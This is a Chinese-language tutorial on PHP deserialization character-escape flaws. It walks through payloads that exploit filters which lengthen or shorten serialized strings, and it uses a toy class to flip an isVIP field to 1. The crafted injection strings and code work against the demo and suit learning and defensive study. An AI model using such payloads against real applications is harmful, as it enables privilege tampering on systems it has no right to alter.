# php反序列化字符逃逸



### php反序列化字符逃逸的原理

当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。



### php反序列化字符逃逸分类

> 过滤后**字符变多**
>
> 过滤后**字符变少**





### 过滤后字符变多

我们先定义一个类 `user` ,成员变量 `username`，`password`，`isVIP`，并且序列化

```php
<?php
class user{
	public $username;
	public $password;
	public $isVIP;

	public function __construct($u,$p){
		$this->username = $u;
		$this->password = $p;
		$this->isVIP = 0;
	}
}
$obj = new user('admin','123456');
$obj = serialize($obj);
echo $obj;
```

输出：

```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

我们可以看到，我们user类的对象默认 isVIP=0，并且不受传入参数的影响



这时我们增加一个过滤：

```php
function filter($obj) {
    return preg_replace("/admin/","hacker",$obj);
}
```

完整代码：

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($obj) {
    return preg_replace("/admin/","hacker",$obj);
}

$obj = new user('admin','123456');
$obj = filter(serialize($obj));
echo $obj;
```

输出：

```php
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

此时，`admin`在序列化串中已经变成了 `hacker` ，并且字符串长度比5多了一个，变成了6

我们对比一下两次的输出：

```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}//过滤前
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //过滤后
```

我们想要构造，将 isVIP的值变成 1，如何才能做到呢？`admin位置`现有字串与目标字串如下：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //现有字串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标字串
```

我们知道，传入的admin位置是**可控变量** ，所以我们需要在该位置插入目标字串，

目标字串的 `";` 将admin参数位置处的双引号闭合，即可造成字符逃逸

但是我们admin参数位置处的字符串长度对应不上，由于我们需要逃逸出来的字符串为：

`";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}` 其长度为47.

这就导致我们admin传参位置的参数少了47长度，必须再添加47长度才行，但是怎么添加呢？

我们知道，每次过滤的时候，`admin` 会变为：`hacker` 长度加了1，所以我们传参时可以重复47次 `admin`。这样我们的参数就会增加47长度，再减去逃逸的47长度字符串，长度就合适了。

可控变量修改如下：

```php
adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
```

完整的代码为：

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($obj) {
    return preg_replace("/admin/","hacker",$obj);
}
$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}', "123456");
$a = serialize($a);
echo $a.PHP_EOL;
$a = filter($a);
echo $a;
print_r(unserialize($a));
```

输出：

```php
O:4:"user":3:{s:8:"username";s:282:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
O:4:"user":3:{s:8:"username";s:282:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}user Object
(
    [username] => hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker
    [password] => 123456
    [isVIP] => 1
)
```

**反序列化后，多余的子串会被抛弃**, 在大括号 } 之外的原先字串就被抛弃了：

`";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}`

我们观察反序列化之后的输出 isVIP=1，反序列化字符串逃逸已经成功了。





### 过滤后字符串变少

我们将上面过滤参数中 `hacker` 改为 `hack`，其余代码不变：

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($obj) {
    return preg_replace("/admin/","hack",$obj);
}

$obj = new user('admin','123456');
$obj = filter(serialize($obj));
echo $obj;
```

输出：

```php
O:4:"user":3:{s:8:"username";s:5:"hack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

发现如果username值存在`admin`,会被替换为 `hack` ，长度减一

此处输出的username值的长度已经不符合5了

我们也要想办法构造，使得 `isVIP=1`  ，我们对比一下现有子串和目标子串：（长度为47）

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //现有
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标
```

php反序列化有一个特性：

**当序列化字符串属性的长度不够时，会往后走，直到长度与规定的长度相等为止.**

> 例如，此处序列化字符串属性值 `hack` 的长度为4，但是原本属性长度为5，所以会往后走1位，属性值为： `hack" `  把后面的双引号也算进去了。也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。

我们计算一下**本可控变量末尾到下一可控变量的长度**：

```php
";s:8:"password";s:6:"   //长度为22
```

因为每次过滤都会少一个字符，我们先将 admin重复22遍：

```php
<?php
class user{
public $username;
public $password;
public $isVIP;

public function __construct($u,$p){
$this->username = $u;
$this->password = $p;
$this->isVIP = 0;
}
}

function filter($s){
return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
```

输出：

```php
{s:8:"username";s:105:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

![img](https://s2.loli.net/2023/01/04/KvXBduNPCS8A9qF.png)

也就是说**123456**这个地方成为了我们的可控变量，在**123456**可控变量的位置中添加我们的目标子串

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}	//目标子串
```

即：

```php
$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
```

我们构造对象，序列化后过滤，再输出：

```php
O:4:"user":3:{s:8:"username";s:105:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

仔细观察这一串字符串可以看到紫色方框内一共107个字符，但是前面只有显示105

![20210820131653.png](https://s2.loli.net/2023/01/04/QmBVMJCvFbYZ8cx.jpg)

**造成这种现象的原因是**：替换之前我们目标子串的位置是**123456**，一共**6**个字符，替换之后我们的目标子串显然超过**10**个字符，所以会造成计算得到的payload不准确

**解决办法是**：多添加**2**个**admin**，这样就可以补上缺少的字符。长度再减2

最终代码：

```php
<?php
class user{
public $username;
public $password;
public $isVIP;

public function __construct($u,$p){
$this->username = $u;
$this->password = $p;
$this->isVIP = 0;
}
}

function filter($s){
return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
```

输出结果：

```php
O:4:"user":3:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

![image-20210820130134043](https://s2.loli.net/2023/01/04/jnr7t4KDGWmdl2S.jpg)

这样长度就对上了。我们将反序列化后的对象输出：

```php
user Object
(
    [username] => hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"
    [password] => 123456
    [isVIP] => 1
)
```

此时 isVIP=1 ，字符逃逸成功！







# 参考文章：

[PHP反序列化字符逃逸详解](https://www.freebuf.com/articles/web/285985.html)







